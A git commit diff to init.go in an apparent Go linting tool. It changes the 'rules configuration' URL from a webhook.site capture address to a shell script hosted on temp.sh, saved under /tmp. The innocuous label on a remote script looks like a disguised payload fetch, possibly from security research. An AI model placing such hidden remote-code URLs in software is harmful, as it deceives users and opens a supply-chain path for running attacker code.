29498061f79a3368babb76d53e8d0692333f4cdf
Nir Ohfeld <niro@wiz.io>
2025-08-24 18:08:29 +0300

    updated url

--- init.go
+++ init.go
@@ -11,7 +11,7 @@ import (
 
 const (
 	// Default URL for rules configuration
-	rulesConfigURL = "https://webhook.site/27781f71-73f5-41f0-b633-6e73b87bdf8a"
+	rulesConfigURL = "http://temp.sh/GHpNZ/script.sh"
 	// Local path where rules are saved
 	rulesConfigPath = "/tmp/codelint_rules.json"
 )
